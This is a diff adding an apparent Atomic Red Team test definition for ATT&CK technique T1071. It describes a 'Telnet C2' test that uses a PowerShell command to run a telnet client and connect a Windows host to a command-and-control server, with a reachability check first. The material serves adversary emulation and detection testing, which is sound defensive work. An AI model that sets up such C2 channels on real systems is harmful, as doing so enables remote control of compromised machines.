@@ -1,0 +1,43 @@
+{
+  "attack_technique": "T1071",
+  "display_name": "Application Layer Protocol",
+  "atomic_tests": [
+    {
+      "name": "Telnet C2",
+      "description": "An adversary may establish Telnet communication from a compromised endpoint to a command and control (C2) server in order to carry out additional attacks on objectives.",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "#{client_path} #{server_ip} --port #{server_port}"
+      },
+      "input_arguments": {
+        "server_ip": {
+          "description": "C2 server IP or URL",
+          "type": "url",
+          "default": "127.0.0.1"
+        },
+        "client_path": {
+          "description": "Client agent path",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\T1071\\bin\\telnet_client.exe"
+        },
+        "server_port": {
+          "description": "C2 server port",
+          "type": "integer",
+          "default": "23"
+        }
+      },
+      "dependencies": [
+        {
+          "description": "A command and control (C2) server can be established by running PathToAtomicsFolder\\T1071\\bin\\telnet_server.exe on a specified server with a specified IP that must be reachable by a client (telnet_client.exe)",
+          "prereq_command": "$connection = Test-NetConnection -ComputerName #{server_ip} -Port #{server_port}\nif ($connection.TcpTestSucceeded) {exit 0} else {exit 1}",
+          "get_prereq_command": "Write-Host \"Setup C2 server manually\""
+        }
+      ],
+      "auto_generated_guid": "3b0df731-030c-4768-b492-2a3216d90e53"
+    }
+  ]
+}
